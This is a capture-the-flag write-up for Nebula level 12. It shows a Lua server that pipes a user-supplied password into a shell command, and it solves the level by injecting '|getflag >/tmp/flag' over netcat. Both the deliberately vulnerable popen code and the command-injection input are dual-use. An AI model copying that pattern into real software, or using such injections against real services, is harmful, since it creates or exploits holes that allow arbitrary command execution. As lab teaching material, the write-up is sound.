---
date: '2012-05-07T17:37:10+10:00'
draft: false
title: 'Nebula Level12 Solution'
tags: ["nebula", "ctf", "solution"]
---

A simple command execution with the .lua code. Initially you need to connect to
localhost on port 50001. Then simply inject the command as 'Password'. Line 5
inserts everything from "Password" prompt to the command string.

```lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
	prog = io.popen("echo "..password.." | sha1sum", "r")
	data = prog:read("*all")
	prog:close()

	data = string.sub(data, 1, 40)

	return data
end


while 1 do
	local client = server:accept()
	client:send("Password: ")
	client:settimeout(60)
	local line, err = client:receive()
	if not err then
		print("trying " .. line) -- log from where ;\
		local h = hash(line)

		if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
			client:send("Better luck next time\n");
		else
			client:send("Congrats, your token is 413**CARRIER LOST**\n")
		end

	end

	client:close()
end
```

## Solutions

```
nc 127.0.0.1 50001
Password: |getflag >/tmp/flag
Better luck next time
less /tmp/flag
You have successfully executed getflag on a target account
```
